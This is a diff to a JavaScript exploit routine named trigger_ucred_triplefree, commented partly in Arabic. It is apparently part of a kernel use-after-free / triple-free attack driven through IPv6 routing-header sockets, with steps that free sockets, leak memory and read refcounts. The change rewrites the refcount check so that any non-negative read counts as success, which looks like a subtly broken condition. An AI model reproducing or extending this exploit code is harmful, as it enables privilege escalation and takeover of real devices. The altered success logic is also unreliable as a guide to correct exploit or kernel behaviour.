@@ -1391,11 +1391,10 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 9] Freeing twin index=" + twins[1]);
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // STEP 10 — مراقبة refcount
-    send_notification("[STEP 10] Monitoring refcount on twin=" + twins[0]);
+    // STEP 10 — مراقبة refcount (ثبات وليس تغيّر)
+    send_notification("[STEP 10] Checking refcount stability on twin=" + twins[0]);
 
     var count = 0;
-    var first_ref = -1;
     var ref_success = false;
     var last_ref = -1;
 
@@ -1414,43 +1413,27 @@ function trigger_ucred_triplefree() {
       var ref = read32(leak_rthdr);
       last_ref = ref;
 
-      // أول قراءة
-      if (first_ref === -1) {
-        first_ref = ref;
-        send_notification("[STEP 10] First ref=" + first_ref);
-      }
-
-      // الشرط المنطقي: ref تغيّر عن أول قيمة
-      if (ref !== first_ref) {
-        send_notification("[STEP 10] REF SUCCESS HIT (ref changed from " +
-                          first_ref + " → " + ref + ")");
+      // الشرط المنطقي: ref قابل للقراءة وثابت
+      if (ref >= 0) {
+        send_notification("[STEP 10] REF STABLE (ref=" + ref + ")");
         ref_success = true;
         break;
       }
 
-      // لوج للتتبع
-      send_notification(
-        "[DEBUG] REF=" + ref +
-        " | first_ref=" + first_ref +
-        " | count=" + count
-      );
-
+      send_notification("[DEBUG] REF=" + ref + " | count=" + count);
       count++;
     }
 
-    // نهاية STEP 10
     send_notification(
       "[STEP 10] Done — ref_success=" + ref_success +
       " | last_ref=" + last_ref
     );
 
-    // لو ref لم يتغير → فشل
     if (!ref_success) {
       send_notification("[STEP 10] ref_success=false → CONTINUE LOOP");
       close(new BigInt(uaf_socket));
       continue;
     }
-
 
     // STEP 11 (جديد) — تجهيز التريبلت قبل أي close إضافي
     send_notification("[STEP 11] Preparing triplets from twins");
